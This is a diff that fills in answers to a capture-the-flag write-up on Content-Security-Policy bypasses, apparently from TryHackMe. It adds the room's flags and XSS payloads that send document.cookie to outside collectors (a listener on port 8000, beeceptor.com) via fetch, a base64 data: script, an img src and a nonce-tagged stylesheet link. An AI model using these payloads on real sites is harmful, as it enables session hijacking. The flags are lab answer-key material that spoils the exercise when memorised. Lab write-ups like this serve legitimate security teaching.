@@ -188,9 +188,7 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 <p><em>Answer the questiona below</em></p>
 
 <p>7.1. Flag for attack-1<br>
-<code>____</code></p>
-
-<br>
+<code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>
 
 <p>
 
@@ -201,7 +199,7 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 - identified that there is <code>default-src</code>:<br> <code>*</code> and<br><code>‘unsafe-inline’</code><br>
 - checked and identified that the directive <code>default-src</code><br> is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.<br>
 - set up an http.server<br>
-- typed a payload <code><script>fetch(`http://10.201.25.139:8000/${document.cookie}`)</script></code><br>
+- typed a payload <code><script>fetch(`http://xx.xxx.xx.xxx:8000/${document.cookie}`)</script></code><br>
 - clicked <code>Submit Query</code><br>
 - received the flag and URL decoded it: <code>THM%7BTh4t_W4s_Pr3tty_3asy%7D</code> = <code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>
 
@@ -225,20 +223,114 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 
 
 <p>7.2. Flag for attack-2<br>
-<code>____</code></p>
+<code>THM{Us1ng_data:_1snt_Any_S4fer}</code></p>
 
 <br>
 
-<p>7.3. Flag for attack-3<br>
-<code>____</code></p>
+<img width="1353" height="198" alt="image" src="https://github.com/user-attachments/assets/67f13b29-2eb5-4699-82b0-d6d15e495dd5" />
 
+
+<br>
+<br>
+
+```bash
+fetch(`https://randomcsp.free.beeceptor.com/${document.cookie}`)
+```
+
+<br>
+<p><em>CyberChef > To Base64</em></p>
+
+```bash
+ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ==
+```
+
+<br>
+<p><em>Payload</em></p>
+
+```bash
+script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ=="></script>
+```
+
+<br>
+
+<img width="1087" height="166" alt="image" src="https://github.com/user-attachments/assets/671ed009-b347-4bbe-b365-6164fb3c9efd" />
+
+<br>
+<br>
+
+
+<img width="1356" height="206" alt="image" src="https://github.com/user-attachments/assets/56b11d55-c5e9-4d86-abce-9cc770b317b6" />
+
+<br>
+<br>
+
+
+<p>7.3. Flag for attack-3<br>
+<code>THM{Th4ts_N0t_4n_1m4ge!!}</code></p>
+
+<br>
+
+<img width="1162" height="409" alt="image" src="https://github.com/user-attachments/assets/331711e2-9423-460e-ac84-1ec82e7b3644" />
+
+
+<br>
+<br>
+<p><em>Payload</em></p>
+
+```bash
+<img id="researcher" src=""> <script>document.getElementById('researcher').src="http://xx.xxx.xx.xxx:8000/" + document.cookie;</script>
+```
+
+<br>
+<br>
+
+<img width="1094" height="156" alt="image" src="https://github.com/user-attachments/assets/230f2030-5bb1-4a82-9d84-77046bc369c3" />
+
+<br>
+<br>
+
+<img width="1358" height="186" alt="image" src="https://github.com/user-attachments/assets/91f5c55f-7e0e-4e56-ad42-1693645a03ea" />
+
+<br>
 <br>
 
 <p>7.4. Flag for attack-4<br>
-<code>____</code></p>
+<code>THM{Style_Y0ur_W3bs1teS}</code></p>
+
+<p><em>researcher.beeceptor.com</em></p>
+<br>
+
+<img width="1125" height="428" alt="image" src="https://github.com/user-attachments/assets/f09cd883-c2dd-4cfc-ab76-c620c40a1bd6" />
 
 <br>
 
+<p><em>CSP Evaluator</em></p>
+<br>
+
+```bash
+Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
+```
+
+<br>
+
+<img width="1086" height="424" alt="image" src="https://github.com/user-attachments/assets/2dae1bdf-9ad3-4f21-bf2c-360f37d3e630" />
+
+<br>
+<p><em>payload</em></p>
+
+```bash
+<link id="researcher" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('researcher').href="https://researcher.free.beeceptor.com/" + document.cookie;</script>
+```
+
+<br>
+
+<p><em>researcher.beeceptor.com</em></p>
+
+```bash
+ GET /flag=THM%7BStyle_Y0ur_W3bs1teS%7D
+```
+
+<br>
 <p>7.5. Flag for attack-5<br>
 <code>____</code></p>
 
@@ -249,7 +341,7 @@ You can access the introduction at http://xx.xxx.xxx.xxx/. </p>
 
 <br>
 
-<p>7.7. Flag for attack-7<br>
+<p>7.7. Flag for attack-7. Hint : The 404 error looks kinda weird...<br>
 <code>____</code></p>
 
 
